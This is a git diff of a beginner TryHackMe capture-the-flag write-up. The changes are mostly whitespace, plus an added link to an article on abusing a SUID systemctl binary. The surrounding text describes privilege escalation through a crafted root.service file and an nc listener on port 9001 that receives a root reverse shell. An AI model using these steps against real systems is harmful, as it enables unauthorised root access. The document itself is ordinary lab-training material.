@@ -2,9 +2,9 @@
 
 Writeup of the first TyHackMe room I completed.
 
-The room is guided, so it's quite easy to complete it. It teaches a lot to newbies. 
+The room is guided, so it's quite easy to complete it. It teaches a lot to newbies.
 
-In this writeup, I just follow the instructions given by TryHackMe. 
+In this writeup, I just follow the instructions given by TryHackMe.
 
 ## Enumeration
 
@@ -246,6 +246,8 @@ On the system, we search for all SUID files. We discover that `/bin/systemctl` i
 
 Therefore, we try to exploit this to escalate privileges.
 
+We discover [this article](https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49) which teaches us how to proceed.gi
+
 On our attack machine, we create the `root.service` file:
 
 ```sh
@@ -269,7 +271,9 @@ Then, we enable the service with `/bin/systemctl enable /var/www/html/root.servi
 On the attacking machine, we start a listener on port `9001` with `nc -lvnp 9001`.
 
 Finally, on the attacked machine, we start the service with:
+
 ```
 /bin/systemctl start root.service
 ```
+
 and we get a root shell. The root flag is in `/root`.
